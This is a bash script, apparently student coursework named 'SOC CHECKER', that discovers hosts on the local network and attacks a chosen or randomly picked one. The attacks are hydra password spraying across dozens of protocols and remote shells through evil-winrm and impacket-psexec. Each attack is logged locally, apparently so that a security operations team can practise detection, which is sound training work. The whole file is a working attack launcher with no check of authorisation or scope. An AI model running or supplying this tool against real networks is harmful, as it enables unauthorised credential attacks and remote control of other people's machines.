#!/bin/bash

# Preparing to colour the output
RED='\033[0;31m'
BRED='\033[1;31m'
NC='\033[0m'
BLUE='\033[0;34m'
BBLUE='\033[1;34m'
GREEN='\033[0;32m'
BGREEN='\033[1;32m'
BYELLOW='\033[1;33m'
echo -e "${BYELLOW}WRITTEN BY: Yossef TSVI - STUDENT CODE: S19" 
echo -e "CLASS CODE: 7736.14     - LECTURER: Lior KAGAN${NC}"

#Banner
figlet "SOC CHECKER"

#ATTACK FUNCTIONS:

function Brute_Force() {

	read -p "ENTER THE FULL PATH TO THE USERS LIST: " users_lst
	while [ -z "$users_lst" ]; do
		read -p  "INVALID INPUT! PLEASE ENTER A FULL VALID PATH TO A USERS LIST: " users_lst
	done
	while [[ ! -f "$users_lst" ]]; do
        	read -p "INVALID PATH! PLEASE ENTER A FULL VALID PATH TO A USER LIST: " users_lst
	done
	read -p "ENTER THE PASSWORD TO SPRAY: " pass
	echo
	echo -e "${BGREEN}PERFORMING PORTS SCAN TO HELP DETERMINE WHICH PROTOCOL SHOULD BE USED. IT WILL TAKE A FEW MINUTES...${NC}"
	nmap -sV "$tip" --open | grep open
	echo
	prot_lst=('adam6500' 'asterisk' 'cisco' 'cisco-enable' 'cobaltstrike' 'cvs' 'firebird' 'ftp' 'ftps' 'http' 'https-head' 'https-get' 'https-post' 'http-proxy' 'http-proxy-urlenum' 'icq' 'imap' 'imaps' 'irc' 'ldap2' 'ldap2s' 'ldap3' 'memcached' 'mongodb' 'mssql' 'mysql' 'nntp' 'oracle-listener' 'oracle-sid' 'pcanywhere' 'pcnfs' 'pop3' 'pop3s' 'postgres' 'radmin2' 'rdp' 'redis' 'rexec' 'rlogin' 'rpcap' 'rsh' 'rtsp' 's7-300' 'sip' 'smb' 'smtp' 'smtps' 'smtp-enum' 'snmp' 'socks5' 'ssh' 'sshkey' 'svn' 'teamspeak' 'telnet' 'telnets' 'vmauthd' 'vnc' 'xmpp')	
	read -p "CHOOSE A PROTOCOL FROM THE LIST (use the above results to choose a relevant one.): 
adam6500, asterisk, cisco, cisco-enable, cobaltstrike, cvs, firebird, ftp, ftps, http, https-head, https-get, https-post, http-proxy, http-proxy-urlenum, icq, imap, imaps, irc, ldap2, ldap2s, ldap3, memcached, mongodb, mssql, mysql, nntp, oracle-listener, oracle-sid, pcanywhere, pcnfs, pop3, pop3s, postgres, radmin2, rdp, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, sip, smb, smtp, smtps, smtp-enum, snmp, socks5, ssh, sshkey, svn, teamspeak, telnet, telnets, vmauthd, vnc, xmpp. " prot_choice
		while [[ ! "${prot_lst[@]}" =~ "$prot_choice" ]]; do
	      	read -p "INVALID PROTOCOL. PLEASE ENTER ONE OF THE ABOVE PROTOCOLS. " prot_choice
        	done	      
	echo
	attack_date=$(date +%d-%m-%Y_%H:%M:%S)

	hydra -L "$users_lst" -p "$pass" -f -t 1 "$tip" "$prot_choice" | grep 'login:'
	echo "PASSWORD SPRAYING, Attacker: "$my_ip", Victim: "$tip", Execution Time: "$attack_date"" > /var/log/soc_checker/"$attack_date"
		if [ $? -eq 0 ]; then
			echo -e "${BBLUE}LOG CREATED.${NC}"
		fi
}

function Remote_Control() {

	read -p "ENTER A USERNAME: " user_name
	while [ -z "$user_name" ]; do
		read -p "INVALID INPUT! PLEASE ENTER A USERNAME. " user_name
	done
	read -p "ENTER THE PASSWORD:" pass
	attack_date=$(date +%d-%m-%Y_%H:%M:%S)
	echo -e "${BGREEN}(Type 'exit' to escape the shell and return to this script after the remote shell succeed.)${NC}"
	echo
	evil-winrm -i "$tip" -u "$user_name" -p "$pass"
	if [ $? -ne 0 ]; then
		echo "EVIL-WINRM, Attacker: "$my_ip", Victim: "$tip", Execution Time: "$attack_date"" > /var/log/soc_checker/"$attack_date"
		echo -e "${BRED}NOT SUCCEED.${NC}" | tee -a /var/log/soc_checker/"$attack_date"
			if [ $? -eq 0 ]; then
				echo -e "${BBLUE}LOG CREATED.${NC}"
			fi
	else
		echo "EVIL-WINRM, Attacker: "$my_ip", Victim: "$tip", Execution Time: "$attack_date"" > /var/log/soc_checker/"$attack_date"
			if [ $? -eq 0 ]; then
				echo -e "${BBLUE}LOG CREATED.${NC}"
			fi
	fi
	
}

function PS_Exec() {
	read -p "ENTER A USERNAME: " user_name
	while [ -z "$user_name" ]; do
		read -p "INVALID INPUT. PLEASE ENTER A USERNAME. " user_name
	done
	read -p "ENTER A PASSWORD: " pass
	attack_date=$(date +%d-%m-%Y_%H:%M:%S)
	echo -e "${BGREEN}(Type 'exit' to escape the shell and return to this script after the remote shell succeed.)${NC}"
	echo
	impacket-psexec "$user_name":"$pass"@"$tip"
		if [ $? -ne 0 ]; then
			echo "PSEXEC, Attacker: "$my_ip", Victim: "$tip", Execution Time: "$attack_date"" > /var/log/soc_checker/"$attack_date"
			echo -e "${BRED}NOT SUCCEED.${NC}" | tee -a /var/log/soc_checker/"$attack_date"
				if [ $? -eq 0 ]; then
					echo -e "${BBLUE}LOG CREATED.${NC}"
				fi
		else
			echo "PSEXEC, Attacker: "$my_ip", Victim: "$tip", Execution Time: "$attack_date"" > /var/log/soc_checker/"$attack_date"
				if [ $? -eq 0 ]; then
					echo -e "${BBLUE}LOG CREATED.${NC}"
				fi
		fi

}

#Function for isolating IPs:
function grep_ip() {
        grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
}

#Function for invalid yes, no or quit input check:
function y_n_inval_inp() {
	while [[ ! "$choice" =~ ^[ynQ]$ ]]; do
		read -p "INVALID INPUT! Type y (for yes), n (for no) or Q (for Quitting). " choice
	done
}

#Function for invalid input ( yes/no without Quit):
function inval_noq_inp() {
	while [[ ! "$answer" =~ ^[yn]$ ]]; do
		read -p "INVALID INPUT! Type y (for yes) or n (for no). " answer
	done
}

#Gathering Network IPs:
my_ip=$(ip a show eth0 | grep_ip | grep -Ev '([0-9]{1,3}\.){3}255')
Network_IPs=$(arp-scan -l | grep_ip)
gateway=$(ip route | grep via | grep_ip | grep -Ev "$my_ip")
readarray -t Target_IPs < <(echo "$Network_IPs" | grep -v "$my_ip")
readarray -t Target_IPs_for_specific < <(echo "$Network_IPs" | grep -v "$my_ip")
Target_IPs_for_specific+=(QUIT)


#Function for selecting a specific Target IP:
function select_target() {
        select tip in "${Target_IPs_for_specific[@]}"; do
                 if [ -z $tip ]; then
			 echo "INVALID INPUT! Please enter the number corresponding to the IP you chose (e.g.: 1)."
                 else
                         break
                 fi
        done
}

#Function for randomly choosing Target IP:
function random_choice() {
	random_index=$((RANDOM % ${#Target_IPs[@]}))
	tip=${Target_IPs[$random_index]}
}

#Array of attacks:
Attack_lst=('PASSWORD SPRAYING' 'PSEXEC' 'EVIL-WINRM' 'QUIT') 


#Function for selecting an attack:
function select_attack() {
	select attack in "${Attack_lst[@]}"; do
		if [[ -z $attack ]]; then 
			echo "INVALID INPUT! Please enter the number corresponding to the attack you chose to perform (e.g.: 1)."
		else
			break
		fi
	done
}

#Function for Quitting:
function Quitting() {
	echo -e "${BGREEN}QUITTING... BYE BYE!${NC}"
	exit 0
}

#Checking if the directory for storing logs exists under /var/log. Creating it if not.
echo -e "${BRED}CHECKING IF /var/log/soc_checker EXISTS AND CREATING IT IF NOT. ATTACKS LOGS WILL BE STORED THERE.${NC}"
[ -d /var/log/soc_checker ] || mkdir /var/log/soc_checker
echo

#Displaying Network Info:
echo -e "${BLUE}SCANNING FOR HOSTS:${NC}"
echo
echo -e "${BYELLOW}Hosts up:${NC}"
echo "$Network_IPs"
echo
echo -e "${BYELLOW}Your IP:${NC}"
echo "$my_ip"
echo
echo -e "${BYELLOW}Network Gateway:${NC}"
echo "$gateway"
echo

#This prompt will allow the user to enter the first while loop.
read -p "DO YOU WANT TO TARGET A SPECIFIC IP (IF NO, WE WILL CHOOSE A RANDOM IP)?[y/n/Q] (INPUT y for yes, n for no or Q for Quitting.) " choice
y_n_inval_inp
echo
if [[ $choice == Q ]]; then
	Quitting
fi

#First while loop that will trap the user into choosing random IPs or specific IPs, until he' ll hit the Quit option.
while [[ $choice == [yn] ]]; do

#Secondary while loop. This loop will trap the user on random IPs until he chooses to quit or specific IPs.
	while [[ $choice == n ]]; do
		echo "CHOOSING A RANDOM TARGET IP."
		random_choice
		echo
		echo "CHOSEN IP: "$tip""
		echo -e "${BGREEN}CHECKING THE OPERATING SYSTEM OF THE CHOSEN IP. IT MIGHT TAKE A FEW MINUTES... ${NC}"
		nmap -sV "$tip" | grep "OS:" 2>/dev/null	
		echo
		echo "CHOOSE AN ATTACK TO PERFORM ON THE CHOSEN IP:"
		select_attack
			if [[ $attack == 'QUIT' ]]; then
				Quitting
			fi
		echo
		echo "CHOSEN ATTACK: $attack"
			if [[ $attack =~ 'PASSWORD SPRAYING' ]]; then
				echo "Spray a specific password on a users list. You will have to choose a protocol. You will also need to provide for a users list and a password to spray. Available for all OS."
				echo
				read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
				inval_noq_inp
					if [[ $answer == y ]]; then
						Brute_Force
					fi
			elif [[ $attack =~ 'EVIL-WINRM' ]]; then
				echo "Try to get full control over a Windows OS, using the winRM protocol as you were in front of the remote computer. You will need ports 5985 or 5986 to be opened. You will also need credentials."
				echo
				read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
				inval_noq_inp
					if [[ $answer == y ]]; then
#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

						nmap -sV $tip -p 5985 | grep -E "5985/tcp open|5986/tcp open" &>/dev/null
							if [ $? -eq 0 ]; then				
								Remote_Control
							else
								echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
							fi
					fi
			elif [[ $attack =~ 'PSEXEC' ]]; then
				echo "Try to get remote shell over a Windows OS, using the psexec sysinternal tool. You will need ports 445 or 139 to be opened. You will also need credentials."
				read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
				inval_noq_inp
					if [[ $answer == y ]]; then
	
#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

						nmap -sV $tip -p 139,445 | grep -E "139/tcp open|445/tcp open" &>/dev/null
							if [ $? -eq 0 ]; then
								PS_Exec
							else
								echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
							fi
					fi
			
			fi
#This prompt will enter the user into the following while loop so he could continue performing attacks on this IP as long as he wants.
		read -p "DO YOU WANT TO PERFORM ANOTHER ATTACK ON THIS IP?[y/n/Q]" choice
		y_n_inval_inp
			if [[ "$choice" == Q ]]; then
				Quitting
			fi
#This while loop will trap the user until he chooses to perform attack(s) on another IP or to quit.
		while [[ "$choice" == y ]]; do
			echo
			echo "CHOOSE AN ATTACK TO PERFORM ON THE CHOSEN IP:"
			select_attack
				if [[ $attack == 'QUIT' ]]; then
					Quitting
				fi
			echo
			echo "CHOSEN ATTACK: $attack"
				if [[ $attack =~ 'PASSWORD SPRAYING' ]]; then
					echo "Spray a specific password on a users list. You will have to choose a protocol. You will also need to provide for a users list and a password to spray. Available for all OS."
					echo
					read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
					inval_noq_inp
						if [[ $answer == y ]]; then
							Brute_Force
						fi
				elif [[ $attack =~ 'EVIL-WINRM' ]]; then
					echo "Try to get full control over a Windows OS, using the winRM protocol as you were in front of the remote computer. You will need ports 5985 or 5986 to be opened. You will also need credentials."
					echo
					read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
					inval_noq_inp
						if [[ $answer == y ]]; then

#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

							nmap -sV $tip -p 5985 | grep "5985/tcp open" &>/dev/null
								if [ $? -eq 0 ]; then					
									Remote_Control
								else
									echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
								fi
						fi
				elif [[ $attack =~ 'PSEXEC' ]]; then
					echo "Try to get remote shell over a Windows OS, using the psexec sysinternal tool. You will need ports 445 or 139 to be opened. You will also need credentials."
					read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
					inval_noq_inp
						if [[ $answer == y ]]; then

#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

							nmap -sV $tip -p 139,445 | grep -E "139/tcp open|445/tcp open" &>/dev/null
								if [ $? -eq 0 ]; then
									PS_Exec
								else
									echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
								fi
						fi

				fi
			echo
#This prompt will allow the user to continue performing attacks on this IP as long as he wants.
			read -p "DO YOU WANT TO PERFORM ANOTHER ATTACK ON THIS IP?[y/n/Q]" choice
			y_n_inval_inp
				if [[ "$choice" == Q ]]; then
					Quitting
				fi

			done
			echo
#This prompt will allow the user to continue into the secondary while loops as long as he wants. If he hits "n" he will stay into the current while loop. If he hits "y" he will continue to the next secondary while loop.	
		read -p "DO YOU WANT TO TARGET A SPECIFIC IP (IF NO, WE WILL CHOOSE A RANDOM IP)?[y/n/Q] (INPUT y for yes, n for no or Q for Quitting.) " choice
		y_n_inval_inp
			if [[ $choice == Q ]]; then
				Quitting
			fi
	done
#Secondary while loop. This loop will trap the user on specific IPs until he chooses to quit or random IPs.
	while [[ "$choice" == y ]]; do
		echo "CHOOSE AN IP TO TARGET: "
        	select_target
		if [[ $tip == 'QUIT' ]]; then
			Quitting
		fi
		echo
		echo "CHOSEN IP: $tip"
		echo
		echo -e "${BGREEN}CHECKING THE OPERATING SYSTEM OF THE CHOSEN IP. IT MIGHT TAKE A FEW MINUTES... ${NC}"
		nmap -sV "$tip" | grep "OS:" 2>/dev/null		
		echo
		echo "CHOOSE AN ATTACK TO PERFOM ON "$tip":"
		select_attack
			if [[ $attack == 'QUIT' ]]; then
				Quitting
			fi
		echo
		echo "CHOSEN ATTACK: $attack"
			if [[ $attack =~ 'PASSWORD SPRAYING' ]]; then
				echo "Spray a specific password on a users list. You will have to choose a protocol. You will also need to provide for a users list and a password to spray. Available for all OS."
				echo	
				read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
				inval_noq_inp
					if [[ $answer == y ]]; then
						Brute_Force
					fi
			elif [[ $attack =~ 'EVIL-WINRM' ]]; then
				echo "Try to get full control over a Windows OS, using the winRM protocol as you were in front of the remote computer. You will need ports 5985 or 5986 to be opened. You will also need credentials."
				read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
				inval_noq_inp
					if [[ $answer == y ]]; then

#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

						nmap -sV $tip -p 5985 | grep "5985/tcp open" &>/dev/null
							if [ $? -eq 0 ]; then						
								Remote_Control
							else
								echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
							fi
					fi
			elif [[ $attack =~ 'PSEXEC' ]]; then
				echo "Try to get remote shell over a Windows OS, using the psexec sysinternal tool. You will need ports 445 or 139 to be opened. You will also need credentials."
				read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
				inval_noq_inp
					if [[ $answer == y ]]; then

#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

						nmap -sV $tip -p 139,445 | grep -E "139/tcp open|445/tcp open" &>/dev/null
							if [ $? -eq 0 ]; then
								PS_Exec
							else
								echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
							fi
					fi
			fi
		echo
#This prompt will enter the user into the following while loop so he could continue performing attacks on this IP as long as he wants.
		read -p "DO YOU WANT TO PERFORM ANOTHER ATTACK ON THIS IP?[y/n/Q]" choice
		y_n_inval_inp
			if [[ "$choice" == Q ]]; then
				Quitting
			fi
#This while loop will trap the user until he chooses to perform attack(s) on another IP.
		while [[ "$choice" == y ]]; do
			echo
			echo "CHOOSE AN ATTACK TO PERFORM ON THE CHOSEN IP:"
			select_attack
				if [[ $attack == 'QUIT' ]]; then
					Quitting
				fi
			echo
			echo "CHOSEN ATTACK: $attack"
				if [[ $attack =~ 'PASSWORD SPRAYING' ]]; then
					echo "Spray a specific password on a users list. You will have to choose a protocol. You will also need to provide for a users list and a password to spray. Available for all OS."
					echo
					read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
					inval_noq_inp
						if [[ $answer == y ]]; then
							Brute_Force
						fi
				elif [[ $attack =~ 'EVIL-WINRM' ]]; then
					echo "Try to get full control over a Windows OS, using the winRM protocol as you were in front of the remote computer. You will need ports 5985 or 5986 to be opened. You will also need credentials."
					echo
					read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
					inval_noq_inp
						if [[ $answer == y ]]; then

#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

							nmap -sV $tip -p 5985 | grep "5985/tcp open" &>/dev/null
								if [ $? -eq 0 ]; then						
									Remote_Control
								else
									echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
								fi
						fi

				elif [[ $attack =~ 'PSEXEC' ]]; then
					echo "Try to get remote shell over a Windows OS, using the psexec sysinternal tool. You will need ports 445 or 139 to be opened. You will also need credentials."
					echo
					read -p "DO YOU STILL WANT TO PERFORM THIS ATTACK?[y/n] " answer
					inval_noq_inp
						if [[ $answer == y ]]; then
			
#Checking if relevant port(s) to the attack is/are opened and therefore if the chosen attack is performable. If yes the attack will be performed. If not the user will receive a message that he cannot perform this attack.

							nmap -sV $tip -p 139,445 | grep -E "139/tcp open|445/tcp open" &>/dev/null
								if [ $? -eq 0 ]; then
									PS_Exec
								else
									echo -e "${BRED}CANNOT PERFORM THIS ATTACK ON THIS IP, CHOOSE ANOTHER.${NC}"
								fi
						fi

				fi
			echo
#This prompt will allow the user to continue performing attacks on this IP as long as he wants.
			read -p "DO YOU WANT TO PERFORM ANOTHER ATTACK ON THIS IP?[y/n/Q]" choice
			y_n_inval_inp
				if [[ "$choice" == Q ]]; then
					Quitting
				fi

		done
	echo
#This prompt will allow the user to continue into the first while loop as long as he wants.
        read -p "DO YOU WANT TO TARGET A SPECIFIC IP (IF NO, WE WILL CHOOSE A RANDOM IP)?[y/n/Q] (INPUT y for yes, n for no or Q for Quitting.)" choice
        y_n_inval_inp
		if [[ $choice == Q ]]; then
			Quitting
		fi
	done
done


exit 0
